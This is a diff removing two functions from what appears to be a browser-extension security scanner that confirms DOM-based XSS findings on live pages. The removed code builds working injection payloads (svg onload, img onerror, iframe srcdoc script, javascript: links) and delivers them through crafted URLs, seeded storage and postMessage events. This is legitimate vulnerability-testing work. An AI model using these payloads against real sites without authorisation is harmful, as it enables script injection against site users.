-      const tab = await swRpc("tabs.create", { url: probeUrl, active: false });
-      session.openedTabs.push(tab.id);
-      execReadTabId = tab.id;
-      await _waitForTabLoaded(tab.id, 10000);
-      await new Promise((r) => setTimeout(r, session.waitMs));
-    }
-
-    // READ EXECUTION FLAG before cleanup — this is what distinguishes
-    // a real PoC ("the page actually rendered our payload") from a
-    // taint-only hit ("the marker string reached a sink but was
-    // displayed as text, not interpreted as HTML/JS").
-    if (!execReadTabId && attackerPostedTargetUrl) {
-      execReadTabId = await _findProbeTargetTab(session.pageUrl, session.marker);
-    }
-    if (execReadTabId) {
-      session.executed = await _readProbeExecFlag(execReadTabId, session.marker);
-    }
-    session.status = "done";
-  } catch (e) {
-    session.status = "error";
-    session.error = (e && e.message) || String(e);
-  } finally {
-    session.finishedAt = Date.now();
-    // Close tabs the extension opened. Tabs popped by window.open
-    // inside pages are left so the reviewer can inspect state after
-    // the probe finishes.
-    for (const tid of session.openedTabs) {
-      try { await swRpc("tabs.remove", tid); } catch (_) {}
-    }
-    session.openedTabs = [];
-  }
-}
-
-// Multi-source PoC orchestrator. Consumes the Z3-solver-produced plan
-// (finding.poc) and executes it against the live target:
-//   1. Compose target URL = pageUrl + plan.url.{hash,search,pathname}
-//      (the persistent attacker-controllable bits that gate the path)
-//   2. Open attacker tab on a real cross-origin host (example.com) so
-//      window.open + postMessage cross-origin semantics match a real
-//      attack page — and chrome.scripting can run inside it without
-//      the target's CSP applying to the opener.
-//   3. Open target with marker in hash so intercept.js arms wrappers
-//      at document_start, then pre-inject storage/cookie state via
-//      chrome.scripting on the target.
-//   4. For each plan.event in seq order, run a chrome.scripting call
-//      in the attacker tab that postMessages the structured payload.
-//      The LAST event (carriesPayload=true) carries the marker —
-//      intercept.js detects it when the sink actually parses it.
-//   5. Read the marker execution flag. Verified = REAL PoC; flag
-//      absent after waitMs = NOT_REPRODUCED (CSP blocked, sanitizer
-//      stripped, or the plan's payload doesn't actually exploit).
-//
-// Verification is intercept.js marker-flag only — no Debugger API.
-// CSP-blocked payloads count as non-PoC by definition (per project
-// policy: if the page wouldn't have executed it anyway, it's not a
-// valid finding).
-async function _runStructuredPlan(session) {
-  const plan = session.pocPlan;
-  let execReadTabId = null;
-  try {
-    // Build the target URL from pageUrl + the plan's URL bits + the
-    // marker hash so intercept.js arms wrappers. Hash-from-plan
-    // and marker hash co-exist: plan-hash is the gate value the
-    // bundle reads; marker is a sentinel for execution detection.
-    // Both are present in the URL fragment, attacker has full
-    // control of fragment content per Web spec.
-    let pageUrl;
-    try {
-      pageUrl = new URL(session.pageUrl);
-    } catch (e) {
-      throw new Error("pageUrl is malformed: " + e.message);
-    }
-    // Marker convention matches intercept.js's URL-scan: it reads the
-    // marker from `__apisec=<TOKEN>` in either fragment or search at
-    // document_start and arms its sink wrappers to record any call
-    // whose value contains the token. Without this URL token,
-    // intercept.js stays cold (zero overhead per-navigation) and our
-    // execution flag never gets set — so EVERY structured-plan run
-    // injects the marker even if plan.url has no other content.
-    //
-    // The PLAN HASH MUST COME FIRST. Bundles routinely guard with
-    // `location.hash.startsWith("#tmpl=")` (or similar), and the Z3
-    // PoC plan computed that prefix as part of the gate-evidence. If
-    // we prepend our marker, startsWith fails, the gated branch never
-    // executes, and the probe wrongly reports NOT REPRODUCED.
-    // intercept.js's regex is `[#&]__apisec=` so it matches when the
-    // marker is appended after the plan hash via `&`.
-    // When NO postMessage event carries the payload, the attacker source is a
-    // URL component (location.hash/search/pathname). The plan only put the Z3
-    // *witness* there (e.g. "<svg onload=alert()>"), which neither calls
-    // apiclientsink nor — for <svg onload> via innerHTML — even fires. Weave the
-    // active multi-vector apiclientsink payload into that component instead. The
-    // postMessage-gated case (hash is a gate, payload rides an event) keeps the
-    // witness untouched because _hasPayloadEvent is true.
-    const _hasPayloadEvent = Array.isArray(plan.events) && plan.events.some(function (e) { return e && e.carriesPayload && e.payloadField; });
-    const _planSinkType = session.sinkType || "dom-html";
-    let ph = plan.url && plan.url.hash ? String(plan.url.hash).replace(/^#/, "") : "";
-    if (!_hasPayloadEvent && ph) ph = buildSinkPayload(_planSinkType, ph, session.marker);
-    pageUrl.hash = ph
-      ? "#" + ph + (ph.endsWith("&") ? "" : "&") + "__apisec=" + session.marker
-      : "#__apisec=" + session.marker;
-    if (plan.url && plan.url.search) {
-      const planSearch = String(plan.url.search).replace(/^\?/, "");
-      const params = new URLSearchParams(planSearch);
-      const existing = new URLSearchParams(pageUrl.search);
-      // Single-param search with no payload event ⇒ that param IS the source;
-      // weave the active payload in. Multi-param plans mix gate values we must
-      // preserve literally, so leave those as the Z3 witness.
-      const _searchIsSource = !_hasPayloadEvent && !ph && [...params.keys()].length === 1;
-      // Plan values OVERRIDE pageUrl on conflict — Z3 computed them
-      // as required for the gate.
-      for (const [k, v] of params) existing.set(k, _searchIsSource ? buildSinkPayload(_planSinkType, v, session.marker) : v);
-      pageUrl.search = existing.toString() ? "?" + existing.toString() : "";
-    }
-    if (plan.url && plan.url.pathname) {
-      pageUrl.pathname = String(plan.url.pathname);
-    }
-    const targetUrl = pageUrl.toString();
-    session.recipe = session.recipe || {};
-    session.recipe.targetUrl = targetUrl;
-    session.recipe.marker = session.marker;
-
-    // 2) Pre-injection: cookies + localStorage via chrome.scripting on
-    //    a brief target-tab load. These have to be in place BEFORE the
-    //    bundle reads them; we open the target, inject, navigate again
-    //    to re-trigger module init with the values present.
-    const needsPreInject = (plan.storage && plan.storage.length) || (plan.cookies && plan.cookies.length);
-    if (needsPreInject) {
-      const seedTab = await swRpc("tabs.create", { url: targetUrl, active: false });
-      session.openedTabs.push(seedTab.id);
-      await _waitForTabLoaded(seedTab.id, 10000);
-      try {
-        // Predefined `seedStorage` injector (localStorage + cookies), run by the SW.
-        await swRpc("scripting.exec", { op: "seedStorage", tabId: seedTab.id, args: [plan.storage || [], plan.cookies || []] });
-      } catch (e) {
-        session.error = "pre-inject failed: " + (e && e.message || String(e));
-      }
-      try { await swRpc("tabs.remove", seedTab.id); } catch (_) {}
-      session.openedTabs = session.openedTabs.filter((t) => t !== seedTab.id);
-    }
-
-    // 3) From the attacker tab, window.open(target) + dispatch the
-    //    plan.events sequence with delays. The LAST event carries the
-    //    marker woven into its sink-bearing field — intercept.js sees
-    //    the marker hit the sink and sets the execution flag.
-    const events = Array.isArray(plan.events) ? plan.events.slice() : [];
-    // Construct the actual exploit payload that BOTH satisfies the
-    // sink's Z3-solved shape AND fires _readProbeExecFlag's detection
-    // signals. The detection reads two things per frame:
-    //   1) self["__apisec_fired_<MARKER>"]: set by an inline handler
-    //      (img/svg/script) — requires inline-permissive CSP.
-    //   2) document.getElementById("__apisec_dom_<MARKER>"): proves
-    //      HTML parsing happened — works under strict CSP.
-    // The Z3 witness is just a CONSTRAINT-shape witness (e.g. "<svg"
-    // because the gate required startsWith / contains an XSS marker).
-    // Prefixing the original value with the marker leaves NO active
-    // construct — innerHTML="MARKER:render" parses as inert text. We
-    // EMBED the witness verbatim as the leading bytes (preserves the
-    // gate), then append a real probe-firing payload that contains
-    // the marker substring in both detection forms.
-    function setByPath(obj, path, value) {
-      const parts = String(path || "").split(".").filter(Boolean);
-      if (!parts.length) return value;
-      let cur = obj;
-      for (let i = 0; i < parts.length - 1; i++) {
-        const k = parts[i];
-        if (cur[k] == null || typeof cur[k] !== "object") cur[k] = {};
-        cur = cur[k];
-      }
-      cur[parts[parts.length - 1]] = value;
-      return obj;
-    }
-    function getByPath(obj, path) {
-      const parts = String(path || "").split(".").filter(Boolean);
-      let cur = obj;
-      for (const k of parts) {
-        if (cur == null) return undefined;
-        cur = cur[k];
-      }
-      return cur;
-    }
-    function buildSinkPayload(sinkType, witnessPrefix, marker) {
-      // Payload calls `apiclientsink(origin)` when the browser actually
-      // runs it through whatever execution pipeline applies — innerHTML
-      // parse → inline event handler, eval, javascript: navigation. No
-      // prototype hooks, no substring match. CSP-correct: blocked inline
-      // scripts ⇒ function never called ⇒ NOT REPRODUCED.
-      //
-      // The dom-html payload INTRINSICALLY CONTAINS every shape the
-      // engine's exploit-shape disjunction tests for (`<script`, `<svg`,
-      // `<iframe`, `<img`, ` onerror=`, ` onload=`, ` onclick=`,
-      // `javascript:`). Z3's exploit shape is a `seq.contains` OR-
-      // disjunction; any payload that contains ANY one of those
-      // substrings satisfies it, and ours contains them all — so the
-      // witness Z3 picked is already covered without prepending.
-      // Prepending the raw witness (e.g. "<img") was the previous
-      // approach and produced "<img<svg onload=…>" which the HTML
-      // parser reads as ONE invalid tag named "img<svg" — onload never
-      // fires, the probe wrongly reports NOT REPRODUCED. Witness is
-      // only re-applied when the source-side gate is startsWith-shaped
-      // (currently: code-exec / open-redirect rely on it). Φ
-      // structure isn't exposed to the orchestrator; the dom-html case
-      // is universal enough that this discrimination is sufficient.
-      const witness = typeof witnessPrefix === "string" ? witnessPrefix : "";
-      const call = (origin) => "apiclientsink('" + origin + "')";
-      if (sinkType === "dom-html" || sinkType === "dom-attr") {
-        const origin = sinkType + ":" + marker;
-        // Five parallel vectors covering all 8 exploit-shape substrings.
-        // Any one that survives the sanitizer + CSP fires apiclientsink.
-        return '<svg onload="' + call(origin + ":svg") + '"></svg>'
-             + '<img src=x onerror="' + call(origin + ":img") + '">'
-             + '<iframe srcdoc="<script>parent.' + call(origin + ":iframe") + '</' + 'script>" onclick="' + call(origin + ":onclick") + '"></iframe>'
-             + '<a href="javascript:' + call(origin + ":javascript") + '">x</a>'
-             + '<script>' + call(origin + ":script") + '</' + 'script>';
-      }
-      if (sinkType === "code-exec") {
-        // eval / Function / setTimeout-string. Witness IS the leading
-        // syntax the source-side gate may have constrained; preserve it.
-        return witness + ";" + call("code-exec:" + marker);
-      }
-      if (sinkType === "open-redirect") {
-        // javascript: URL navigation runs the body as a script. Witness
-        // preserved for the same reason.
-        return witness + "javascript:" + call("open-redirect:" + marker);
-      }
-      // Unknown sink: fall back to the dom-html universal payload.
-      return '<svg onload="' + call("unknown:" + marker) + '"></svg>';
-    }
-    for (let i = 0; i < events.length; i++) {
-      const ev = events[i];
-      if (!ev.carriesPayload) continue;
-      const field = ev.payloadField;
-      if (!field) continue;
-      const stripped = field.indexOf("data.") === 0 ? field.slice(5) : field;
-      const witness = typeof getByPath(ev.payload, stripped) === "string"
-        ? getByPath(ev.payload, stripped) : "";
-      const sinkType = session.sinkType || "dom-html";
-      setByPath(ev.payload, stripped,
-        buildSinkPayload(sinkType, witness, session.marker));
-    }
-    session.recipe.events = events.map(e => ({ payload: e.payload, carriesPayload: !!e.carriesPayload }));
-
-    // Open the target via chrome.tabs.create — `window.open(t,_blank)`
-    // from a chrome.scripting MAIN-world injection has no user gesture
-    // and Chrome's popup blocker drops it (the call returns null and
-    // no request is ever issued, so the bundle's message handler never
-    // runs and the probe wrongly reports NOT REPRODUCED). chrome.tabs
-    // creates the tab via the extension's privileged API, not subject
-    // to the popup blocker. Same-window postMessage from the target
-    // itself (window.postMessage(payload, "*")) reaches its own
-    // message handler exactly like a cross-origin postMessage would —
-    // origin pattern "*" matches; the handler's `e.data` shape is the
-    // bit the bundle's gates inspect.
-    const tgtTab = await swRpc("tabs.create", { url: targetUrl, active: false });
-    session.openedTabs.push(tgtTab.id);
-    await _waitForTabLoaded(tgtTab.id, 10000);
-
-    // Predefined `dispatchEvents` injector (the postMessage sequence with
-    // per-message delay), run by the SW since chrome.scripting isn't in the offscreen.
-    await swRpc("scripting.exec", { op: "dispatchEvents", tabId: tgtTab.id, args: [events, 400] });
-
-    // Wait long enough for ALL events to deliver and the handler chain
-    // to settle. baseDelay (500) + n * 400 + post-deliver settle.
-    const settleMs = 500 + events.length * 400 + Math.max(2000, session.waitMs);
-    await new Promise((r) => setTimeout(r, settleMs));
-
-    // tgtTab is the target — we created it, no need to discover by URL.
-    execReadTabId = tgtTab.id;
-    session.executed = await _readProbeExecFlag(execReadTabId, session.marker);
-    session.status = "done";
-  } catch (e) {
-    session.status = "error";
-    session.error = (e && e.message) || String(e);
-  } finally {
-    session.finishedAt = Date.now();
-    for (const tid of session.openedTabs) {
-      try { await swRpc("tabs.remove", tid); } catch (_) {}
-    }
-    session.openedTabs = [];
-  }
-}
 
 async function buildExportRequest(tabId, msg) {
   let parsedUrl;
